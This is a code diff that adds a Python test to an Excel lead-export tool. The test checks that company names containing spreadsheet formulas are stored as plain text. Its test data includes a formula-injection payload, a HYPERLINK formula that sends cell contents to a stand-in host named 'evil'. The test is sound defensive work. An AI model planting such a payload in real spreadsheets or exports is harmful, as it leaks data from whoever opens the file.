@@ -75,3 +75,17 @@ def test_export_writes_headers(tmp_path: Path) -> None:
     ws = wb.active
     assert [c.value for c in ws[1]] == HEADERS
     assert ws.max_row == 2
+
+
+def test_formula_injection_defused(tmp_path: Path) -> None:
+    # 크롤·LLM 유래 업체명에 수식 페이로드가 들어와도 엑셀 수식으로 실행되면 안 된다.
+    payload = '=HYPERLINK("http://evil/?x="&A1,"open")'
+    lead = CompanyLead(company=_company(name=payload))
+    row = build_row(lead)
+    assert row[1] == "'" + payload  # 작은따옴표로 텍스트 못박음
+    out = ExcelExporter().export([lead], tmp_path / "inj.xlsx")
+    cell = load_workbook(out).active.cell(row=2, column=2)
+    assert cell.data_type != "f"  # 수식(f)이 아닌 문자열로 기록됨
+    # 정상 업체명·국제전화(+82)는 변형되지 않는다.
+    assert build_row(_full_lead())[1] == "테스트기업"
+    assert build_row(_full_lead())[2] == "+82-2-1-2"
